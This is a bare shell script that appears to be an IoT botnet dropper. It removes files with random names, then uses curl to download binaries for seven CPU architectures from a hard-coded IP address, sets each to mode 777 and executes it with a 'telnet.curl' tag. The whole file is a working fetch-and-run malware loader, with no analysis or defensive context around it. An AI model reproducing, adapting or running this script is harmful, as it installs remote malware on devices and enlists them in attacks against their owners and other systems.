#!/bin/sh

rm -rf PLXMKJ
rm -rf WQZRTY
rm -rf YUIOXC
rm -rf GHJKLB
rm -rf MNCXOP
rm -rf KFGDFG
rm -rf VFASXC

curl http://103.146.122.62/arm     -o PLXMKJ; chmod 777 PLXMKJ; ./PLXMKJ telnet.curl
curl http://103.146.122.62/arm5    -o WQZRTY; chmod 777 WQZRTY; ./WQZRTY telnet.curl
curl http://103.146.122.62/arm7    -o YUIOXC; chmod 777 YUIOXC; ./YUIOXC telnet.curl
curl http://103.146.122.62/mips    -o GHJKLB; chmod 777 GHJKLB; ./GHJKLB telnet.curl
curl http://103.146.122.62/mpsl    -o MNCXOP; chmod 777 MNCXOP; ./MNCXOP telnet.curl
curl http://103.146.122.62/arc     -o KFGDFG; chmod 777 KFGDFG; ./KFGDFG telnet.curl
curl http://103.146.122.62/aarch64 -o VFASXC; chmod 777 VFASXC; ./VFASXC telnet.curl
